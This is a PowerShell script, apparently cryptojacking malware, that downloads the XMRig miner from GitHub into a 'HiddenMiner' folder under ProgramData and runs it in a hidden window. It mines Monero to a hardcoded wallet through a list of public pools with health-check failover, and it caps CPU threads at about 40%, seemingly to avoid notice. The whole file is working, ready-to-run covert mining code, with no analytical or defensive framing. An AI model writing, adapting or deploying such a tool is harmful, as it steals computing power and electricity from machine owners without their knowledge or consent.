param (
    [string]$ConfigFile = "$env:ProgramData\HiddenMiner\config.json",
    [int]$HealthCheckInterval = 30,
    [int]$RecoveryInterval = 60
)

$LOG_FILE = "$env:ProgramData\HiddenMiner\miner.log"
$INSTALL_LOCK = "$env:ProgramData\HiddenMiner\.installed"
$STATUS_FILE = "$env:ProgramData\HiddenMiner\status.json"
$WALLET = "45BAUhBB2BkXKKsx1xsS2zXgxbEAusmWpVEeswcKJjqvYWav5YAgc2zRvjTnfAzZF19eBQJwM2cPHM2Y3CTekxoCGjocMDg"
$MINER_URL = "https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-win64-msvc.zip"
$MINER_DIR = "$env:ProgramData\HiddenMiner"
$MINER_EXE = "$MINER_DIR\xmrig.exe"

class PoolEndpoint {
    [string]$Url
    [int]$Priority
    [bool]$Enabled
    [datetime]$LastUsed
    [int]$FailCount
    [bool]$Healthy
    PoolEndpoint([string]$url, [int]$priority, [bool]$enabled) {
        $this.Url = $url
        $this.Priority = $priority
        $this.Enabled = $enabled
        $this.LastUsed = [datetime]::Now
        $this.FailCount = 0
        $this.Healthy = $true
    }
}

function Write-Log {
    param([string]$Level, [string]$Message)
    $line = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') [$Level] $Message"
    Add-Content -Path $LOG_FILE -Value $line -ErrorAction SilentlyContinue
}

function Ensure-Miner {
    if (Test-Path $MINER_EXE) { return }
    New-Item -ItemType Directory -Path $MINER_DIR -Force | Out-Null
    $zip = "$env:TEMP\xmrig.zip"
    Invoke-WebRequest -Uri $MINER_URL -OutFile $zip -UseBasicParsing
    Expand-Archive -Path $zip -DestinationPath "$env:TEMP\xmrig" -Force
    $found = Get-ChildItem -Path "$env:TEMP\xmrig" -Recurse -Filter "xmrig.exe" | Select-Object -First 1
    if ($found) { Copy-Item $found.FullName $MINER_EXE -Force }
    Remove-Item $zip -Force -ErrorAction SilentlyContinue
}

function Load-Config {
    if (Test-Path $ConfigFile) {
        $json = Get-Content -Path $ConfigFile -Raw | ConvertFrom-Json
        $pools = @()
        foreach ($p in $json.Pools) {
            $pools += [PoolEndpoint]::new($p.Url, $p.Priority, $p.Enabled)
        }
        return @{
            Pools = $pools
            HealthCheckInterval = $json.HealthCheckInterval
            RecoveryInterval = $json.RecoveryInterval
            WalletAddress = $json.WalletAddress
        }
    }
    $defaultPools = @(
        [PoolEndpoint]::new("pool.supportxmr.com:443", 1, $true),
        [PoolEndpoint]::new("xmr-eu1.nanopool.org:14433", 2, $true),
        [PoolEndpoint]::new("pool.hashvault.pro:443", 3, $true)
    )
    return @{
        Pools = $defaultPools
        HealthCheckInterval = 30
        RecoveryInterval = 60
        WalletAddress = $WALLET
    }
}

function Save-Config {
    param([object]$Config)
    $json = @{
        Pools = $Config.Pools | ForEach-Object {
            @{
                Url = $_.Url
                Priority = $_.Priority
                Enabled = $_.Enabled
                LastUsed = $_.LastUsed
                FailCount = $_.FailCount
                Healthy = $_.Healthy
            }
        }
        HealthCheckInterval = $Config.HealthCheckInterval
        RecoveryInterval = $Config.RecoveryInterval
        WalletAddress = $Config.WalletAddress
    } | ConvertTo-Json -Depth 3
    $json | Out-File -FilePath $ConfigFile -Encoding utf8
}

function Test-Health {
    param([string]$Url)
    try {
        $tcp = New-Object System.Net.Sockets.TcpClient
        $hostPort = $Url -split ':'
        $async = $tcp.BeginConnect($hostPort[0], [int]$hostPort[1], $null, $null)
        $wait = $async.AsyncWaitHandle.WaitOne(3000, $false)
        if (-not $wait) { $tcp.Close(); return $false }
        $tcp.EndConnect($async)
        $tcp.Close()
        return $true
    } catch { return $false }
}

function Get-ActivePool {
    param([array]$Pools)
    return $Pools | Where-Object { $_.Enabled -and $_.Healthy } | Sort-Object Priority | Select-Object -First 1
}

function Update-PoolStatus {
    param([PoolEndpoint]$Pool, [bool]$Success)
    $Pool.LastUsed = [datetime]::Now
    if ($Success) {
        $Pool.FailCount = 0
        $Pool.Healthy = $true
    } else {
        $Pool.FailCount++
        if ($Pool.FailCount -ge 3) { $Pool.Healthy = $false }
    }
    return $Pool
}

function Report-Status {
    param([string]$PoolUrl, [string]$Reason)
    @{
        CurrentPool = $PoolUrl
        Timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
        Reason = $Reason
    } | ConvertTo-Json | Out-File -FilePath $STATUS_FILE -Encoding utf8
}

function Main {
    New-Item -ItemType Directory -Path $MINER_DIR -Force | Out-Null
    Ensure-Miner
    $config = Load-Config
    Save-Config -Config $config

    while ($true) {
        $active = Get-ActivePool -Pools $config.Pools
        if (-not $active) {
            Write-Log -Level "Error" -Message "No healthy pools"
            Start-Sleep -Seconds 60
            foreach ($p in $config.Pools) { $p.Healthy = $true; $p.FailCount = 0 }
            continue
        }

        if (-not (Test-Health -Url $active.Url)) {
            $active = Update-PoolStatus -Pool $active -Success $false
            Save-Config -Config $config
            Report-Status -PoolUrl $active.Url -Reason "unhealthy"
            Start-Sleep -Seconds 10
            continue
        }

        Report-Status -PoolUrl $active.Url -Reason "mining"
        $args = @(
            "--url", $active.Url,
            "--user", $config.WalletAddress,
            "--pass", "x",
            "--donate-level", "1",
            "--tls",
            "--threads", ([Math]::Max(1, [Math]::Ceiling((Get-CimInstance Win32_Processor).NumberOfLogicalProcessors * 0.4)))
        )

        try {
            $proc = Start-Process -FilePath $MINER_EXE -ArgumentList $args -WindowStyle Hidden -PassThru
            $proc.WaitForExit()
            $ok = ($proc.ExitCode -eq 0)
        } catch {
            $ok = $false
            Write-Log -Level "Error" -Message $_.Exception.Message
        }

        $active = Update-PoolStatus -Pool $active -Success $ok
        Save-Config -Config $config
        Start-Sleep -Seconds 15
    }
}

Main